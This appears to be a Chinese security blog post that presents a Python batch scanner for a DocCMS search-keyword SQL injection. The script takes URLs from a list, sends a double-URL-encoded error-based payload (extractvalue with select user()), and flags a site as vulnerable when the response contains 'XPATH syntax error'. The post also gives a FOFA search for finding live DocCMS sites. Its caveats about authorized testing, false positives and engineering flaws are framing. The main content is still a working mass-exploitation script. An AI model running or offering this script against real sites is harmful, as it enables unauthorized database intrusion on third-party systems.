ailx10说：这篇是2024年8月之前写的，后来又改过。鸡爪流 day3，我沿用 DocCMS 的那次手工经验，把版本识别、keyword 请求、报错判断和 CSV 输出接成脚本。原来在浏览器里一眼能看见的错误，现在得决定哪些文字算有效线索、哪些状态该继续处理。写到这里才觉得，自动化不只是把请求循环一下，误报、漏报、超时和异常都得安排位置。这篇就是当时那版流程的记录；它让我更愿意把发现线索和最终确认分开保存，而不是让一个泛泛的错误提示替整个实验下结论。

---

day3把DocCMS二次编码报错探测封装批量脚本，识别页面注释版本，请求keyword后用200与XPATH syntax error判定并CSV保存。

核查提示：只接受200会漏掉其他状态下错误，字符串无专属标记有误报可能；HTTPS关闭校验和无超时是工程缺陷，不把本文当现成安全扫描规范。 原实验和代码未重新运行，图内细节有待核验。

本文分析历史 DocCMS 检测脚本，重点观察响应特征与误报条件；相关测试仅适用于授权环境。

- 找到对应的POC：[ailx10：DocCMS keyword SQL注入漏洞复现](/posts/a0374/)
- 找到对应的网站：FOFA搜索`body="DocCMS"`

下面是原记录中的示例代码；其输入、异常处理和作用范围需要结合实验环境审查。

脚本只接受状态码 200 且使用通用错误字符串，可能漏报或误报，不能仅凭该结果确认实际漏洞。

![](/notes-assets/101d43f9ee03b0a28180.webp)

```
import re
import os
import csv
import base64
import struct
import socket
import requests
from datetime import datetime
from urllib.parse import quote
import binascii

class DocCMS():
    def __init__(self):
        self.version = "-1"
        self.vuln_exist = "-1"
        self.vuln_success_url = "-1"
        self.vuln_success_result = "-1"


    def encode_url(self,paylaod):
        byte_string = paylaod.encode('utf-8')
        hex_encoded = binascii.hexlify(byte_string)
        percent_encoded = '%'.join([hex_encoded[i:i + 2].decode('utf-8') for i in range(0, len(hex_encoded), 2)])
        return "%"+percent_encoded

    def encode_url_2(self,paylaod):

        payload_encode2 = self.encode_url(self.encode_url(paylaod))

        return "1"+payload_encode2

    def check_vulnerability(self,url):
        try:
            response = requests.get(url)
            pattern = r"<!--本网站由稻壳企业建站系统生成 (Power by DocCms.*)-->"
            match = re.search(pattern,response.text)
            if match:
                self.version = match.group(1)
                print("DocCms版本:{}".format(self.version))
            else:
                print("DocCms版本:未知")

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            }
            paylaod = "' and (extractvalue(1,concat(0x7e,(select user()),0x7e)))#"
            payload_encode2 = self.encode_url_2(paylaod)

            vuln_url = "{}/search/index.php?keyword={}".format(url,payload_encode2)
            if url.startswith("https://"):
                response = requests.get(vuln_url,headers=headers, verify=False)
            else:
                response = requests.get(vuln_url, headers=headers)
            if response.status_code == 200:
                if 'XPATH syntax error' in response.text:
                    print("vuln exist:{}".format(url))
                    self.vuln_exist = 1
                    self.vuln_success_result = 1
                    self.vuln_success_url = vuln_url
                else:
                    print("no vuln:{}".format(url))
                    self.vuln_exist = 0
        except Exception as e:
            print("网络异常:{}".format(e))


    def append_data_to_csv(self,file_name, data):
        file_path = os.path.join(os.getcwd(), file_name)
        file_exists = False
        if os.path.exists(file_path):
            file_exists = True
        with open(file_path, 'a+', newline='') as csvfile:
            writer = csv.writer(csvfile)
            if not file_exists:
                writer.writerow(data.keys())
            writer.writerow(data.values())




if __name__ == "__main__":
    test_url_list = []
    now = datetime.now()
    date_string = now.strftime("%Y-%m-%d")
    with open('url.txt', 'r', encoding='utf-8') as file:
        for line in file:
            test_url_list.append(line.strip())
    for url in test_url_list:
        cms = DocCMS()
        url = url[:-1] if url.endswith("/") else url
        cms.check_vulnerability(url)

        url_vuln_info = {
                "url":url,
                "version":cms.version,
                "vuln_exist":cms.vuln_exist,
                "vuln_success_url":cms.vuln_success_url,
                "vuln_success_result":cms.vuln_success_result,
                "date_string":date_string
            }
        cms.append_data_to_csv("out.csv",url_vuln_info)
```

不过只认状态码和一段错误文字，会把复杂的响应压得太扁。更稳妥的方向，是给验证结果留下专属标记、请求和异常信息，让“扫到了”后面还能继续追问。
